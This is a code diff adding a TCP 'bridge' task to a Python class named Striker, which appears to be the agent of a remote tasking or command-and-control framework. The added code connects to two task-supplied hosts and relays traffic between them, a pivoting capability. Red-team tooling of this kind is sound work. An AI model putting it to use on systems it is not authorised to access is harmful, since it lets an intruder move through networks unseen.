@@ -107,6 +107,47 @@ class Striker:
     server.close()
     return
 
+  def bridge(self, task, host1, port1, host2, port2):
+    while not self.abort and not task["abort"]:
+      conn1 = socket.socket()
+      conn1.settimeout(10)
+      try:
+        conn1.connect((host1, port1))
+      except socket.error:
+        sleep(5)
+        continue
+      conn2 = socket.socket()
+      conn2.settimeout(10)
+      try:
+        conn2.connect((host2, port2))
+      except socket.error:
+        conn1.close()
+        sleep(5)
+        continue
+      conn1.settimeout(0.05)
+      conn2.settimeout(0.05)
+      blockSize = 999999
+      while not self.abort and not task["abort"]:
+        try:
+          data = conn1.recv(blockSize)
+          if len(data) == 0:
+            break
+          conn2.send(data)
+        except socket.error as e:
+          if not str(e).startswith("timed out"):
+            break
+        try:
+          data = conn2.recv(blockSize)
+          if len(data) == 0:
+            break
+          conn1.send(data)
+        except socket.error as e:
+          if not str(e).startswith("timed out"):
+            break
+      conn1.close()
+      conn2.close()
+    return
+
   def execTask(self, task):
     taskID = task['uid']
     data = {}
@@ -177,6 +218,14 @@ class Striker:
         successful = 1
       except Exception as e:
         result = "Error starting TCP tunnel: " + str(e)
+    elif (task["taskType"] == "bridge"):
+      host1 = data["host1"]
+      port1 = int(data["port1"])
+      host2 = data["host2"]
+      port2 = int(data["port2"])
+      self.bridge(task, host1, port1, host2, port2)
+      successful = 1
+      result = "TCP bridge closed!"
     elif (task["taskType"] == "kill"):
       targetID = data["uid"]
       for tID in self.tasks:
